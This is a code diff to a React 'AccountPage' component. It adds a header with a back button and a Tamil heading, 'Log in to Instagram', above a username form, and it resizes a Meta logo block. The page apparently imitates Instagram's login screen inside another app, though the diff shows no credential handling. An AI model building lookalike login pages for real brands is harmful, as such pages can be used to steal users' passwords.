@@ -57,7 +57,36 @@ export default function AccountPage() {
 </div>
 
 
-<p>Instagram இல் உள்நுழையுங்கள்</p>
+
+{/* Login Header */}
+<div className="flex items-center justify-center relative px-7 pt-8 pb-6">
+  {/* Back Arrow */}
+  <button
+    type="button"
+    aria-label="Go back"
+    className="absolute left-7 top-1/2 -translate-y-1/2 flex items-center justify-center w-9 h-9 rounded-full hover:bg-gray-100 transition"
+  >
+    <svg
+      viewBox="0 0 24 24"
+      fill="currentColor"
+      width="24"
+      height="24"
+      aria-hidden="true"
+    >
+      <path
+        fillRule="evenodd"
+        clipRule="evenodd"
+        d="M16.753 4.341a1 1 0 0 0-1.412-.094l-8 7a1 1 0 0 0 0 1.506l8 7a1 1 0 0 0 1.318-1.506L9.518 12l7.14-6.247a1 1 0 0 0 .094-1.412z"
+      />
+    </svg>
+  </button>
+
+  {/* Heading */}
+  <h2 className="text-base font-semibold text-gray-900 text-center">
+    Instagram இல் உள்நுழையுங்கள்
+  </h2>
+</div>
+
 
         <form onSubmit={submit} className="px-7 pb-5 space-y-3">
           <input className={inputCls} placeholder={t("acct.username")} value={username} onChange={e => setUsername(e.target.value)} autoComplete="username" required maxLength={60} />
@@ -71,7 +100,7 @@ export default function AccountPage() {
 
 
            {/* Meta Logo */}
-  <div className="flex justify-center pt-2">
+  <div className="flex justify-center pt-2 h-[40px]">
     <svg
       aria-label="Meta Logo"
       className="w-28 h-auto"
